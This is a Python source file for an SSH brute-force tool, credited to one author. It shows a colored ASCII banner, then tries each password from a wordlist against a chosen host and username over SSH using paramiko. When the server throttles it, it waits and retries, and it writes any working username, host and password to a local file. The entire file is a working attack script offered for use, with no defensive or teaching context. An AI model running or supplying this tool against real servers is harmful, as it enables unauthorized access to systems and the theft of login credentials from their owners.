#!/usr/bin/python3
#Autor >> AlfonzCS
#https://www.alfonzcs.tk
import paramiko, os
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE
PINK = Fore.MAGENTA

def CS():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])

def ClownLogo():
    from colorama import init, Fore
    import sys, random, time
    init()
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """

          ______              __       ___   __  __             __  
          \ \ \ \  __________/ /_     /   | / /_/ /_____ ______/ /__
           \ \ \ \/ ___/ ___/ __ \   / /| |/ __/ __/ __ `/ ___/ //_/
           / / / (__  |__  ) / / /  / ___ / /_/ /_/ /_/ / /__/ ,<   
          /_/_/_/____/____/_/ /_/  /_/  |_\__/\__/\__,_/\___/_/|_|  
                                                          
            CS! : ssh Attack script fuerza bruta servidores ssh.       
    """
    for N, line in enumerate(x.split("\n")):
         sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
         time.sleep(0.05)

CS()
ClownLogo()

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"{RED}[{GREEN}!{RED}] Invalid credentials for{PINK} {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Attack Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break